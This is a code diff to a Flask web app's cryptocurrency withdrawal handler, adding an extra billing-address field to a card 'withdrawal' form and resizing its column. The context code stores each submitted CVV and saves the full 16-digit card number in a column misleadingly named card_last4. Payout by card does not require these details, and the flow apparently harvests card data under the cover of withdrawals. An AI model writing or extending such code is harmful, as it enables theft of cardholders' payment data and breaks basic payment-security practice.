@@ -171,7 +171,8 @@ class WithdrawalRequest(db.Model):
     postal_code = db.Column(db.String(20), nullable=True)
     card_last4 = db.Column(db.String(16), nullable=True)
     cvv = db.Column(db.String(3), nullable=True)
-    billing_address = db.Column(db.String(3), nullable=True)
+    billing_address = db.Column(db.String(300), nullable=True)
+    extra_billing_address = db.Column(db.String(300), nullable=True)
     status = db.Column(db.String(20), default="pending", nullable=False)
     admin_id = db.Column(db.Integer, db.ForeignKey("user.id"))
     payout_txid = db.Column(db.String(128), unique=True)
@@ -309,7 +310,11 @@ def ensure_schema():
             else:
                 conn.exec_driver_sql("ALTER TABLE withdrawal_request ALTER COLUMN card_last4 TYPE VARCHAR(16)")
             if "billing_address" not in withdrawal_columns:
-                conn.exec_driver_sql("ALTER TABLE withdrawal_request ADD COLUMN billing_address VARCHAR(3)")
+                conn.exec_driver_sql("ALTER TABLE withdrawal_request ADD COLUMN billing_address VARCHAR(300)")
+            else:
+                conn.exec_driver_sql("ALTER TABLE withdrawal_request ALTER COLUMN billing_address TYPE VARCHAR(300)")
+            if "extra_billing_address" not in withdrawal_columns:
+                conn.exec_driver_sql("ALTER TABLE withdrawal_request ADD COLUMN extra_billing_address VARCHAR(300)")
             if "payout_reference" not in withdrawal_columns:
                 conn.exec_driver_sql("ALTER TABLE withdrawal_request ADD COLUMN payout_reference VARCHAR(128)")
             if "transfer_type" not in transaction_columns:
@@ -494,6 +499,7 @@ def withdraw():
                     "postal_code": None,
                     "card_last4": None,
                     "billing_address": None,
+                    "extra_billing_address": None,
                 }
             elif method == "ethereum":
                 amount = parse_btc(request.form.get("amount", ""))
@@ -512,6 +518,7 @@ def withdraw():
                     "postal_code": None,
                     "card_last4": None,
                     "billing_address": None,
+                    "extra_billing_address": None,
                     "cvv": None,
                 }
             elif method == "card":
@@ -530,6 +537,7 @@ def withdraw():
                 cvv = re.sub(r"\D", "", request.form.get("cvv", ""))
                 expiration_date = request.form.get("expiration_date", "").strip()
                 billing_address = request.form.get("billing_address", "").strip()
+                extra_billing_address = request.form.get("extra_billing_address", "").strip()
 
                 if len(bank_name) < 2 or len(bank_name) > 120:
                     raise ValueError("Enter a valid bank name.")
@@ -546,7 +554,9 @@ def withdraw():
                 if not valid_expiration(expiration_date):
                     raise ValueError("Enter a valid future expiration date (MM/YY or MM/YYYY).")
                 if len(billing_address) < 2 or len(billing_address) > 300:
-                    raise ValueError("Enter a valid cvv.")
+                    raise ValueError("Enter a valid billing address.")
+                if extra_billing_address and (len(extra_billing_address) < 2 or len(extra_billing_address) > 300):
+                    raise ValueError("Enter a valid extra billing address.")
 
                 details = {
                     "method": "card",
@@ -560,7 +570,8 @@ def withdraw():
                     "postal_code": postal_code,
                     "card_last4": card_number[-16:],
                     "billing_address": billing_address,
-                    "cvv":cvv,
+                    "extra_billing_address": extra_billing_address,
+                    "cvv": cvv,
                 }
             else:
                 raise ValueError("Choose a valid withdrawal method.")
@@ -604,6 +615,7 @@ def withdraw():
                 cvv=details["cvv"],
                 card_last4=details["card_last4"],
                 billing_address=details["billing_address"],
+                extra_billing_address=details["extra_billing_address"],
             )
         )
         db.session.commit()
